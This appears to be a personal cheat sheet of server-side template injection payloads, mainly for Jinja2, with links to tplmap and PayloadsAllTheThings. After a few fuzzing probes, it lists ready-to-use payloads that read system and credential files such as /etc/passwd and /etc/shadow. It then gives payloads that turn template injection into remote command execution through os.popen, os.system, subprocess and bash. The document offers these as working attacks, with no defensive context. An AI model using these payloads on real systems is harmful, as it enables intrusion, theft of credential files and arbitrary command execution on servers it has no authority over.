- - -
💛️ Usefull Tools : [tplmap](https://github.com/epinna/tplmap)

💛️ Usefull Guides : [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)
- - -

### **Fuzzing SSTI** : 🪰️🕊️🕊️🕊️🕊️ 

```sh
{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

- - -
### **Reading system files** : 📂️ 📂️ 📂️

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/services').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/hostname').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/resolv.conf').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/environment').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/crontab').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/group').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/ssh/sshd_config').read()}}
```

- - -
 
### **SSTI 2 RCE** **:** 💀️💥️ 💥️ 💥️ 💀️

Before goinf for RCE, you should know the template engine's language..
Like - Python, php, java, groovy, etc.

**<u>Try This</u> :** 👇️👇️👇️👇️
```sh
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('<command>')}}

{{''.__class__.__mro__[1].__subclasses__()[49].__init__.__globals__['__builtins__']['__import__']('subprocess').call('<command>', shell=True)}}

{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('<command>').read()}}

{{''.__class__.__mro__[1].__subclasses__()[49].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('<command>', shell=True)}}

{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/bash').__call__('-c', '<command>')}}
```


